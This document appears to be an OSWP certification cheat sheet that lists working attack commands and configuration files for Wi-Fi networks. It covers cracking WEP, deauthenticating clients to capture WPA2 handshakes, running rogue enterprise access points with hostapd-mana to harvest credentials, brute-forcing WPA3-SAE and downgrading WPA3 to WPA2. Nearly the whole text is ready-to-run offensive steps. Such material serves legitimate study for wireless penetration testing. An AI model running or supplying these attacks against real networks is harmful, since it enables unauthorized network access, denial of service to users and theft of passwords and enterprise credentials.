# OSWP Cheat Sheet

## **ESSID Brute Force**

If the ESSID is hidden for any AP, we can identify by brute forcing using.

```bash
iwconfig wlan0mon channel 11
mdk4 wlan0mon p -t <AP bssid> -f ~/wifi-rockyou.txt
```

## Attacking OPN

Save the below params within the file ‘free.conf’

```
network={
	ssid="<--ESSIF-->"
	key_mgmt=NONE
	scan_ssid=1
}
```

To connect to AP network in terminal using ‘wpa_supplicant’ 

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
#Request Ip in network from DHCP
dhclient wlan2 -v
```

## Attacking WEP

Discover network with WEP encryption using airodump-ng

```bash
airodump-ng wlan0mon --encrypt wep
```

Automatic brute for using besside-ng

```bash
besside-ng -c <ch-no> -b <AP-BSSID> wlan2 -v
```

Manual capture and cracking

```bash
# capture the traffic
sudo airodump-ng -c <ch-no> --bssid <AP-BSSID> -w <output-filename> wlan0mon

# To generate some extra data to the AP we do fake authentication
sudo aireplay-ng -1 3600 -q  10 -a <AP-BSSID> wlan0mon

# And generate some traffic by launching an ARP-request replay attack
sudo aireplay-ng --arpreplay -b <AP-BSSID> -h <Connected-Client> wlan0mon

# To Crack the password
sudo aircrack-ng <captured_out_file>.cap
```

Connect to the network save the below params in file ‘wep.conf’

```
network={
  ssid="$ESSID"
  key_mgmt=NONE
  wep_key0=<$CRACKED_PASS>
  wep_tx_keyidx=0
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c wep.conf

# Request Ip in network from DHCP
dhclient wlan2 -v
```

## **Attacking WPA2-PSK**

```bash
# Discover and monitor all nearby access points
sudo airodump-ng wlan0

# monitor and capture specific access point using bssid (mac address)
sudo airodump-ng wlan0 --bssid <AP_BSSID> -c <chl no> -w <filename to same in all formats>

# Perform deauth attack and capture handshake
sudo aireplay-ng -0 10 -a <ap bssid> -c <any client mac id> wlan0

# crack captured handshake
aircrack-ng -w <passwordlist.txt> -b <ap bssid> <captured .cap file in airodump-ng>
```

If we have AP’s password we can decrypt cap file using airdecap-ng 

```bash
airdecap-ng -e <$AP_ESSID> -p <$Password> <captured_cap_file>
```

To connect to AP save the below params in file psk.conf

```bash
network={
    ssid="$ESSID"
    psk="$PASSWORD"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c psk.conf

# Request Ip in network from DHCP
dhclient wlan2 -v
```

## **Attacking WPA Enterprise**

Discover and monitor all nearby access points

```bash
sudo airodump-ng --band abg wlan0mon
sudo airodump-ng --band abg wlan0mon -c <$x> --bssid <$BSSID> -w <#pcap_file_name>
```

To do deauth attack to capture handshake

```bash
sudo iwconfig wlan0mon channel <$x>
sudo aireplay-ng wlan0mon -0 4 -a <$BSSID> -c <$client_mac>
```

once captured handshake and we have extract about certificate information

```bash
wireshark <#pcap_file_name>
openssl x509 -inform der -in CERTIFICATE_FILENAME -text
```

Replace the certificate information in the freeradius certificate and make certificate

```bash
sudo apt install freeradius
nano /etc/freeradius/3.0/certs/ca.conf
nano /etc/freeradius/3.0/certs/server.conf
rm dh
make
```

Create new config file ‘mana.conf’ to create new Rough AP using hostapd-mana 

```
ssid=<$BSSID>
interface=<$INTERFACE>
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/root/wifi/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
```

We'll now need to create the EAP user file referenced in the configuration file, **mana.eap_user**. The file should contain the following.

```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

To launch Rough AP

```bash
hostapd-mana mana.conf
```

To kick client to connect to hosted Rough AP, we have to perform deauth attack

```bash
iwconfig wlan0mon channel 44
aireplay-ng -0 0 wlan0mon -a <$AP_BSSID> -c <$Client_BSSID>
```

Once captured the handshake, we have crack the password

```bash
hashcat -a 0 -m 5500 hashfile ~/rockyou-top100000.txt  --force
```

Follow the below to connect the wifi using wpa_supplicant

```
# Save the below params in wpa-epa.conf
network={
 ssid="<$SSID>"
 scan_ssid=1
 key_mgmt=WPA-EAP
 eap=PEAP
 identity="<$identity\user>"
 password="<$password>"
 phase1="peaplabel=0"
 phase2="auth=MSCHAPV2"
}
```
```bash
sudo wpa_supplicant -i wlan1 -c wpa-epa.conf
sudo dhclient wlan1 -v
```

## **Attacking WPA3-SAE**

### **Brute Force**

WPA3-SAE is also vulnerable to brute force attack util found the valid password. we can use the wacker tool to brute force the password.

[**https://github.com/blunderbuss-wctf/wacker**](https://github.com/blunderbuss-wctf/wacker)  

```bash
python3 wacker.py --wordlist <$Password_file> --interface wlan2 --bssid <$AP_BSSID> --ssid <$AP_ESSID> --freq 2462
```

### **Downgrade WPA3 to WPA2**

If a network uses WPA3 SAE and has a client configured for both WPA2/WPA3, an attacker can perform a downgrade attack to force the client to connect to a rogue access point (RogueAP) using WPA2. This allows the attacker to obtain the WPA2 handshake, which can later be cracked. The attacker can identify if the access point uses SAE and PSK by checking the information in the airodump-ng ".csv" file, indicating that clients might also accept PSK.

save the below params in ‘hostapd-sae.conf‘ file to launch the Rough AP

```
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

run the below command to launch the Rough AP

```bash
hostapd-mana hostapd-sae.conf
```

if the Management Frame Protection (MFP) is set to false, we ca do deauth to connect the client to rough AP to get handshake. we can find MFP in beacon frame using wireshark.

```bash
aireplay-ng wlan0mon -0 0 -a <$AP_BSSID> -c <$CLIENT_MAC>
```

Crack the password

```bash
hashcat -a 0 -m 2500 hostapd-management.hccapx <$PASSWORD_WD_LIST> --force
```

Incase 2500 mode doesn’t work use the 22000 mode

```bash
hcxhash2cap --hccapx=hostapd-management.hccapx -c aux-management.pcap
hcxpcapngtool aux-management.pcap -o hash-management.22000
sudo hashcat -a 0 -m 22000 hash-management.22000 <$Password> --force
```

To connect to the network using wpa_supplicant. save the below param in ‘sae.conf’ file

```
network={
    ssid="$ESSID"
    psk="$PASSWORD"
    key_mgmt=WPA-PSK
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c sae.conf

# Request Ip in network from DHCP
dhclient wlan2 -v
```
